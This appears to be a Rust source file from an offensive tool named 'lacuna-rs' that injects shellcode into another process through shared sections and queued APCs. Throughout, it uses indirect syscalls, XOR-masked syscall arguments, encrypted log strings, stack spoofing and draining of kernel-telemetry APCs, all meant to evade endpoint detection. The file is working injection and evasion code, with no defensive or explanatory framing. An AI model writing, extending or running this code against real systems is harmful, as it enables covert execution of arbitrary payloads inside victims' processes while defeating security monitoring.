//
// inject.rs — Section-based APC injection for lacuna-rs
//
// Ported from lacuna_chain.c: do_inject_sapc().
//
// Thread selection algorithm ported from main.c: FindActiveApcThreads().
//
// All diagnostic output wrapped in litcrypt lc!() calls.
//

#![cfg(feature = "inject")]
#![allow(dead_code)]
#![allow(unused_imports)]
#![allow(unused_unsafe)]
#![allow(unused_variables)]

use crate::nt;
use crate::pe;
use crate::stub;
use crate::win::{
    self, HANDLE, HMODULE, NTSTATUS, ULONG64, PVOID, SIZE_T,
    LARGE_INTEGER,
    OBJECT_ATTRIBUTES, CID, CLIENT_ID,
    PAGE_READWRITE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE,
    SEC_COMMIT, SECTION_ALL_ACCESS, ViewUnmap,
    PROCESS_VM_OPERATION, PROCESS_QUERY_INFORMATION,
    THREAD_SET_CONTEXT, THREAD_ALERT, THREAD_QUERY_INFORMATION,
    TH32CS_SNAPTHREAD, INVALID_HANDLE_VALUE,
    PNtOpenProcess, PNtCreateSection, PNtMapViewOfSection,
    PNtUnmapViewOfSection, PNtOpenThread, PNtQueueApcThread,
    PNtAlertThread, PNtClose, PNtQueryInformationThread,
    nt_ok, get_module,
    CreateToolhelp32Snapshot, Thread32First, Thread32Next,
    CloseHandle, OpenThread, THREADENTRY32,
    NtDelayExecution,
    KERNEL_USER_TIMES, THREAD_CYCLE_TIME_INFORMATION, THREAD_BASIC_INFORMATION,
    ThreadBasicInformation, ThreadTimes, ThreadCycleTime, ThreadSuspendCount,
};
use core::ptr;
use core::sync::atomic::Ordering;

extern crate alloc;
use alloc::vec::Vec;

use lc;

/// Maximum number of top-scoring threads to queue APCs to.
pub const MAX_APC_THREADS: usize = 5;

pub struct Syscalls {
    pub open_proc: stub::Stub,
    pub mk_sec: stub::Stub,
    pub map_view: stub::Stub,
    pub unmap_view: stub::Stub,
    pub open_thr: stub::Stub,
    pub queue_apc: stub::Stub,
    pub alert_thr: stub::Stub,
    pub nt_close: stub::Stub,
    pub prot_vm: stub::Stub,
    pub srs: [ULONG64; 9],
}

impl Syscalls {
    pub fn resolve(ntdll: HMODULE) -> Option<Self> {
        const NAMES: &[&[u8]] = &[
            b"NtOpenProcess\0",
            b"NtCreateSection\0",
            b"NtMapViewOfSection\0",
            b"NtUnmapViewOfSection\0",
            b"NtOpenThread\0",
            b"NtQueueApcThread\0",
            b"NtAlertThread\0",
            b"NtClose\0",
            b"NtProtectVirtualMemory\0",
        ];

        let mut srs = [0u64; 9];
        let mut stubs: Vec<Option<stub::Stub>> = Vec::with_capacity(9);
        for i in 0..9 {
            let (ssn, sr) = nt::resolve(ntdll, NAMES[i]);
            srs[i] = sr;
            stubs.push(stub::make_stub(ssn, sr));
        }

        for i in 0..9 {
            let ssn = nt::resolve_ssn(ntdll, NAMES[i]);
            let sr = srs[i];
            let sr_off = if sr != 0 { sr - ntdll as ULONG64 } else { 0 };
            let name = trim_cstr(NAMES[i]);
            eprintln!(
                "{}{:24}  ssn={:02x}  {}{:x}",
                lc!("[*] "),
                core::str::from_utf8(name).unwrap_or("?"),
                ssn,
                lc!("syscall;ret=ntdll+"),
                sr_off,
            );
        }

        Some(Syscalls {
            open_proc: stubs[0].take()?,
            mk_sec: stubs[1].take()?,
            map_view: stubs[2].take()?,
            unmap_view: stubs[3].take()?,
            open_thr: stubs[4].take()?,
            queue_apc: stubs[5].take()?,
            alert_thr: stubs[6].take()?,
            nt_close: stubs[7].take()?,
            prot_vm: stubs[8].take()?,
            srs,
        })
    }
}

fn trim_cstr(s: &[u8]) -> &[u8] {
    let n = s.iter().position(|&b| b == 0).unwrap_or(s.len());
    &s[..n]
}

pub const PKEY: u64 = 0xCAFE_1337;

#[inline]
fn ep(p: *mut ()) -> *mut () {
    #[cfg(feature = "veh")]
    { (p as usize ^ PKEY as usize) as *mut () }
    #[cfg(not(feature = "veh"))]
    { p }
}

#[inline]
fn ep_u32(v: u32) -> u32 {
    #[cfg(feature = "veh")]
    { v ^ PKEY as u32 }
    #[cfg(not(feature = "veh"))]
    { v }
}

#[inline]
fn ep_handle(h: HANDLE) -> HANDLE {
    #[cfg(feature = "veh")]
    { (h as usize ^ PKEY as usize) as HANDLE }
    #[cfg(not(feature = "veh"))]
    { h }
}

#[inline]
fn ep_usize(v: usize) -> usize {
    #[cfg(feature = "veh")]
    { v ^ PKEY as usize }
    #[cfg(not(feature = "veh"))]
    { v }
}

// ── Thread scoring algorithm (ported from main.c: FindActiveApcThreads) ───────

/// A thread candidate with its activity score.
struct ThreadCandidate {
    tid: u32,
    score: i64,
    cycles: u64,
    cpu_time: u64,
    priority: i32,
    suspend_count: u32,
}

/// Resolve NtQueryInformationThread from ntdll at runtime.
fn resolve_nt_query_info_thread(ntdll: HMODULE) -> Option<PNtQueryInformationThread> {
    let p = win::get_proc(ntdll, b"NtQueryInformationThread\0")?;
    unsafe { Some(core::mem::transmute(p)) }
}

/// Query thread suspend count via NtQueryInformationThread.
fn query_suspend_count(nqit: PNtQueryInformationThread, h: HANDLE) -> u32 {
    let mut sc: u32 = 999;
    let status = unsafe {
        nqit(h, ThreadSuspendCount, &mut sc as *mut _ as PVOID,
             core::mem::size_of::<u32>() as u32, ptr::null_mut())
    };
    if nt_ok(status) { sc } else { 999 }
}

/// Query thread kernel+user time via NtQueryInformationThread.
fn query_cpu_time(nqit: PNtQueryInformationThread, h: HANDLE) -> u64 {
    let mut times: KERNEL_USER_TIMES = unsafe { core::mem::zeroed() };
    let status = unsafe {
        nqit(h, ThreadTimes, &mut times as *mut _ as PVOID,
             core::mem::size_of::<KERNEL_USER_TIMES>() as u32, ptr::null_mut())
    };
    if nt_ok(status) { times.UserTime + times.KernelTime } else { 0 }
}

/// Query thread cycle time via NtQueryInformationThread.
fn query_cycles(nqit: PNtQueryInformationThread, h: HANDLE) -> u64 {
    let mut ci: THREAD_CYCLE_TIME_INFORMATION = unsafe { core::mem::zeroed() };
    let status = unsafe {
        nqit(h, ThreadCycleTime, &mut ci as *mut _ as PVOID,
             core::mem::size_of::<THREAD_CYCLE_TIME_INFORMATION>() as u32, ptr::null_mut())
    };
    if nt_ok(status) { ci.AccumulatedCycles } else { 0 }
}

/// Query thread priority via NtQueryInformationThread.
fn query_priority(nqit: PNtQueryInformationThread, h: HANDLE) -> i32 {
    let mut bi: THREAD_BASIC_INFORMATION = unsafe { core::mem::zeroed() };
    let status = unsafe {
        nqit(h, ThreadBasicInformation, &mut bi as *mut _ as PVOID,
             core::mem::size_of::<THREAD_BASIC_INFORMATION>() as u32, ptr::null_mut())
    };
    if nt_ok(status) { bi.Priority } else { 9 }
}

/// Score a thread based on activity, suspend state, and priority.
fn score_thread(cycles: u64, cpu_time: u64, suspend_count: u32, priority: i32) -> i64 {
    let mut score: i64 = 0;
    // Activity (primary factor)
    score += (cycles as i64) / 1_000_000;
    score += (cpu_time as i64) / 100_000;
    // Bonuses for active threads
    if suspend_count == 0 { score += 300; }
    if priority >= 8 && priority <= 10 { score += 150; }
    if cycles > 5_000_000 { score += 100; }
    // Penalties for problematic threads
    if suspend_count > 0 { score -= 150 * suspend_count as i64; }
    if priority < 1 || priority > 15 { score -= 100; }
    score
}

/// Scan all threads in a process, score them, and return the top-N candidates.
///
/// Ported from main.c: FindActiveApcThreads().
fn find_active_apc_threads(pid: u32, max_candidates: usize, ntdll: HMODULE) -> Vec<ThreadCandidate> {
    let nqit = match resolve_nt_query_info_thread(ntdll) {
        Some(f) => f,
        None => {
            eprintln!("{}", lc!("[-] NtQueryInformationThread not found"));
            return Vec::new();
        }
    };

    let snap = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0) };
    if snap == INVALID_HANDLE_VALUE {
        eprintln!("{}", lc!("[-] thread snapshot failed"));
        return Vec::new();
    }

    let mut te = THREADENTRY32 {
        dwSize: core::mem::size_of::<THREADENTRY32>() as u32,
        cntUsage: 0, th32ThreadID: 0, th32OwnerProcessID: 0,
        tpBasePri: 0, tpDeltaPri: 0, dwFlags: 0,
    };

    let mut candidates: Vec<ThreadCandidate> = Vec::new();

    let mut ok = unsafe { Thread32First(snap, &mut te) } != 0;
    while ok {
        if te.th32OwnerProcessID == pid {
            let tid = te.th32ThreadID;
            let h = unsafe {
                OpenThread(
                    THREAD_QUERY_INFORMATION | THREAD_SET_CONTEXT,
                    0,
                    tid,
                )
            };
            if !h.is_null() {
                let sc = query_suspend_count(nqit, h);
                let cpu_time = query_cpu_time(nqit, h);
                let cycles = query_cycles(nqit, h);

                // Skip completely idle threads
                if cycles == 0 && cpu_time == 0 {
                    unsafe { CloseHandle(h) };
                    ok = unsafe { Thread32Next(snap, &mut te) } != 0;
                    continue;
                }

                let priority = query_priority(nqit, h);
                let score = score_thread(cycles, cpu_time, sc, priority);

                candidates.push(ThreadCandidate {
                    tid, score, cycles, cpu_time, priority, suspend_count: sc,
                });

                unsafe { CloseHandle(h) };
            }
        }
        ok = unsafe { Thread32Next(snap, &mut te) } != 0;
    }
    unsafe { CloseHandle(snap) };

    // Sort: highest score first, tie-break on highest cycles
    candidates.sort_by(|a, b| {
        if a.score != b.score {
            b.score.cmp(&a.score)
        } else {
            b.cycles.cmp(&a.cycles)
        }
    });

    // Truncate to max_candidates
    candidates.truncate(max_candidates);

    for (i, c) in candidates.iter().enumerate() {
        eprintln!(
            "{}{}: {} {} ({} {}, {} {}, {} {}, {} {}, {} {})",
            lc!("[+] Candidate "), i + 1,
            lc!("TID "), c.tid,
            lc!("Score: "), c.score,
            lc!("Cycles: "), c.cycles,
            lc!("CPU: "), c.cpu_time,
            lc!("Pri: "), c.priority,
            lc!("Suspend: "), c.suspend_count,
        );
    }

    candidates
}

// ── Main injection function ───────────────────────────────────────────────────

/// Inject shellcode via section-based APC.
///
/// Set `verbose = true` to enable VEH diagnostic output.
pub fn inject_sapc(pid: u32, shellcode: &[u8]) -> Result<(), NTSTATUS> {
    inject_sapc_verbose(pid, shellcode, false)
}

/// Inject shellcode via section-based APC with verbose flag.
pub fn inject_sapc_verbose(pid: u32, shellcode: &[u8], verbose: bool) -> Result<(), NTSTATUS> {
    let ntdll = get_module(b"ntdll.dll\0");
    let ntdll_base = ntdll as ULONG64;

    #[cfg(feature = "veh")]
    {
        crate::veh::set_verbose(verbose);
        let self_mod = unsafe { win::GetModuleHandleA(core::ptr::null()) };
        if !self_mod.is_null() {
            let base = self_mod as ULONG64;
            let end = base + pe::size_of_image(self_mod);
            crate::veh::G_EXE_BASE.store(base, Ordering::Relaxed);
            crate::veh::G_EXE_END.store(end, Ordering::Relaxed);
            if verbose {
                eprintln!("{}{:016x}-{:016x}", lc!("[*] exe range for stack spoof: "), base, end);
            }
        }
    }

    let sc = Syscalls::resolve(ntdll).ok_or(0xC000_0001u32 as i32)?;

    let ret_gadget = if sc.srs[7] != 0 { sc.srs[7] + 2 } else { 0 };
    #[cfg(feature = "veh")]
    {
        crate::veh::G_RET_GADGET.store(ret_gadget, Ordering::Relaxed);
        if ret_gadget != 0 && verbose {
            eprintln!("{}{:x}", lc!("[*] ret gadget for stack spoof: ntdll+"), ret_gadget - ntdll_base);
        }
    }

    #[cfg(feature = "veh")]
    let _pcrypt_guard = crate::veh::PcryptVehGuard::register();

    // -- NtOpenProcess --
    let mut h_proc: HANDLE = ptr::null_mut();
    let mut oa = OBJECT_ATTRIBUTES::default();
    let cid = CID { UniqueProcess: pid as HANDLE, UniqueThread: ptr::null_mut() };

    #[cfg(feature = "veh")]
    crate::veh::pcrypt_arm(PKEY, sc.srs[0], true);

    eprintln!("{}", lc!("[*] calling NtOpenProcess..."));

    let open_proc: PNtOpenProcess = unsafe { core::mem::transmute(sc.open_proc.as_fn()) };
    let status = unsafe {
        open_proc(
            ep(&mut h_proc as *mut _ as *mut _) as win::PHANDLE,
            ep_u32(PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION),
            ep(&mut oa as *mut _ as *mut _) as *mut OBJECT_ATTRIBUTES,
            ep(&cid as *const _ as *mut _) as *mut CLIENT_ID,
        )
    };
    if !nt_ok(status) {
        eprintln!("{}{:08x}", lc!("[-] NtOpenProcess: "), status);
        return Err(status);
    }
    eprintln!("{}{:p}{}{}", lc!("[+] proc  "), h_proc, lc!("  pid "), pid);

    #[cfg(feature = "veh")]
    let _chain_guard = crate::veh::ChainVehGuard::register();

    // -- stomp_plant --
    #[cfg(feature = "stack-spoof")]
    {
        #[cfg(feature = "veh")]
        crate::veh::pcrypt_disarm();

        eprintln!("{}", lc!("[*] calling stomp_plant..."));
        crate::chain::stomp_plant();
        eprintln!("{}", lc!("[*] stomp_plant done"));
    }

    // -- NtCreateSection --
    let mut h_sec: HANDLE = ptr::null_mut();
    let mut sec_sz: LARGE_INTEGER = shellcode.len() as i64;

    #[cfg(feature = "veh")]
    {
        if verbose {
            eprintln!("{}{:x}", lc!("[*] arming pcrypt for NtCreateSection (srs[1]="), sc.srs[1]);
        }
        crate::veh::pcrypt_arm(PKEY, sc.srs[1], true);
    }

    eprintln!("{}", lc!("[*] calling NtCreateSection..."));

    let mk_sec: PNtCreateSection = unsafe { core::mem::transmute(sc.mk_sec.as_fn()) };
    let status = unsafe {
        mk_sec(
            ep(&mut h_sec as *mut _ as *mut _) as win::PHANDLE,
            ep_u32(SECTION_ALL_ACCESS),
            ep(ptr::null_mut()) as *mut OBJECT_ATTRIBUTES,
            ep(&mut sec_sz as *mut _ as *mut _) as *mut LARGE_INTEGER,
            PAGE_EXECUTE_READWRITE, SEC_COMMIT, ptr::null_mut(),
        )
    };
    if !nt_ok(status) {
        eprintln!("{}{:08x}", lc!("[-] NtCreateSection: "), status);
        unsafe { close_handle(&sc, h_proc) };
        return Err(status);
    }
    eprintln!("{}{:p}", lc!("[+] section  "), h_sec);

    // -- NtMapViewOfSection (local, RW) --
    let mut local_base: PVOID = ptr::null_mut();
    let mut local_sz: SIZE_T = 0;
    let map_view: PNtMapViewOfSection = unsafe { core::mem::transmute(sc.map_view.as_fn()) };

    #[cfg(feature = "veh")]
    crate::veh::pcrypt_arm(0, sc.srs[2], false);

    let status = unsafe {
        map_view(h_sec, win::CURRENT_PROCESS, &mut local_base, 0, shellcode.len(),
                 ptr::null_mut(), &mut local_sz, ViewUnmap, 0, PAGE_READWRITE)
    };
    if !nt_ok(status) {
        eprintln!("{}{:08x}", lc!("[-] NtMapViewOfSection(local): "), status);
        unsafe { close_handle(&sc, h_sec) };
        unsafe { close_handle(&sc, h_proc) };
        return Err(status);
    }
    eprintln!("{}{:p}", lc!("[+] local rw  "), local_base);

    // Write shellcode (double-XOR)
    unsafe {
        let dst = local_base as *mut u8;
        for i in 0..shellcode.len() { *dst.add(i) = shellcode[i] ^ 0x5A; }
        for i in 0..shellcode.len() { *dst.add(i) ^= 0x5A; }
    }
    eprintln!("{}{}{}", lc!("[+] shellcode written ("), shellcode.len(), lc!(" bytes)"));

    // -- NtMapViewOfSection (remote, RX) --
    let mut remote_base: PVOID = ptr::null_mut();
    let mut remote_sz: SIZE_T = 0;

    #[cfg(feature = "veh")]
    crate::veh::pcrypt_arm(PKEY, sc.srs[2], false);

    let status = unsafe {
        map_view(
            ep_handle(h_sec), ep_handle(h_proc),
            ep(&mut remote_base as *mut _ as *mut _) as *mut PVOID,
            ep_usize(0), shellcode.len(), ptr::null_mut(), &mut remote_sz,
            ViewUnmap, 0, PAGE_EXECUTE_READ,
        )
    };
    if !nt_ok(status) {
        eprintln!("{}{:08x}", lc!("[-] NtMapViewOfSection(remote): "), status);
        unsafe { close_handle(&sc, h_sec) };
        unsafe { close_handle(&sc, h_proc) };
        return Err(status);
    }
    eprintln!("{}{:p}", lc!("[+] remote rx  "), remote_base);

    // -- Unmap local + close section --
    let unmap_view: PNtUnmapViewOfSection = unsafe { core::mem::transmute(sc.unmap_view.as_fn()) };

    #[cfg(feature = "veh")]
    crate::veh::pcrypt_arm(0, sc.srs[3], true);

    eprintln!("{}{:p}", lc!("[*] unmapping local view (base="), local_base);
    let unmap_status = unsafe { unmap_view(win::CURRENT_PROCESS, local_base) };
    if verbose {
        eprintln!("{}{:08x}", lc!("[*] unmap returned "), unmap_status);
    }

    eprintln!("{}", lc!("[*] closing section..."));
    unsafe { close_handle(&sc, h_sec) };

    // -- Select best threads for APC (scored, top-N) --
    eprintln!("{}", lc!("[*] scanning threads for APC candidates..."));
    let candidates = find_active_apc_threads(pid, MAX_APC_THREADS, ntdll);

    if candidates.is_empty() {
        eprintln!("{}", lc!("[-] no suitable thread candidates found"));
        unsafe { close_handle(&sc, h_proc) };
        return Err(0xC000_0022u32 as i32);
    }

    eprintln!("{}{}{}", lc!("[+] found "), candidates.len(), lc!(" candidate thread(s)"));

    let open_thr: PNtOpenThread = unsafe { core::mem::transmute(sc.open_thr.as_fn()) };
    let queue_apc: PNtQueueApcThread = unsafe { core::mem::transmute(sc.queue_apc.as_fn()) };
    let alert_thr: PNtAlertThread = unsafe { core::mem::transmute(sc.alert_thr.as_fn()) };

    let mut queued = 0;
    for c in &candidates {
        let tcid = CID { UniqueProcess: pid as HANDLE, UniqueThread: c.tid as HANDLE };
        let mut toa = OBJECT_ATTRIBUTES::default();
        let mut ht: HANDLE = ptr::null_mut();

        #[cfg(feature = "veh")]
        crate::veh::pcrypt_arm(0, sc.srs[4], true);

        let ts = unsafe {
            open_thr(&mut ht as *mut _ as win::PHANDLE,
                     THREAD_SET_CONTEXT | THREAD_ALERT,
                     &mut toa as *mut _ as *mut OBJECT_ATTRIBUTES,
                     &tcid as *const _ as *mut CLIENT_ID)
        };
        if nt_ok(ts) {
            #[cfg(feature = "veh")]
            crate::veh::pcrypt_arm(0, sc.srs[5], true);

            let ts = unsafe { queue_apc(ht, remote_base, remote_base, ptr::null_mut(), ptr::null_mut()) };
            if nt_ok(ts) {
                eprintln!("{}{}", lc!("[+] apc  tid "), c.tid);
                #[cfg(feature = "veh")]
                crate::veh::pcrypt_arm(0, sc.srs[6], true);
                let _ = unsafe { alert_thr(ht) };
                queued += 1;
            }
            unsafe { close_handle(&sc, ht) };
        }
    }

    if queued == 0 {
        eprintln!("{}", lc!("[-] no threads took the APC"));
        unsafe { close_handle(&sc, h_proc) };
        return Err(0xC000_0022u32 as i32);
    }
    eprintln!("{}{}{}", lc!("[+] queued to "), queued, lc!(" thread(s)"));

    // -- Drain ETW-Ti APCs --
    #[cfg(feature = "stack-spoof")]
    {
        #[cfg(feature = "veh")]
        crate::veh::pcrypt_disarm();

        eprintln!("{}", lc!("[*] entering alertable wait to drain APCs..."));
        let mut drain: LARGE_INTEGER = -100_000;
        unsafe { NtDelayExecution(1, &mut drain) };
        eprintln!("{}", lc!("[*] APC drain complete, restoring stack..."));
        crate::chain::stomp_restore();
    }

    #[cfg(feature = "veh")]
    crate::veh::pcrypt_disarm();

    unsafe { close_handle(&sc, h_proc) };
    Ok(())
}

#[inline]
unsafe fn close_handle(sc: &Syscalls, h: HANDLE) {
    let nt_close: PNtClose = core::mem::transmute(sc.nt_close.as_fn());
    let _ = nt_close(h);
}